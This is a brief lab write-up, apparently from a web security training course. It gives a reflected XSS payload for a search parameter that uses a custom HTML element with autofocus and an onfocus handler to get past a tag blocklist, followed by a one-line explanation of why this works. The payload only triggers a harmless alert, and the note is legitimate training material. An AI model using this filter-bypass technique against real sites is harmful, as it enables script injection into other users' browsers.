# Lab 15 — Reflected XSS All Tags Blocked Except Custom (PRACTITIONER)

## Payload
```
/search?search=<xss autofocus onfocus=alert(1) tabindex=1>
```
Custom elements not in blocklist. autofocus triggers onfocus without clicks.
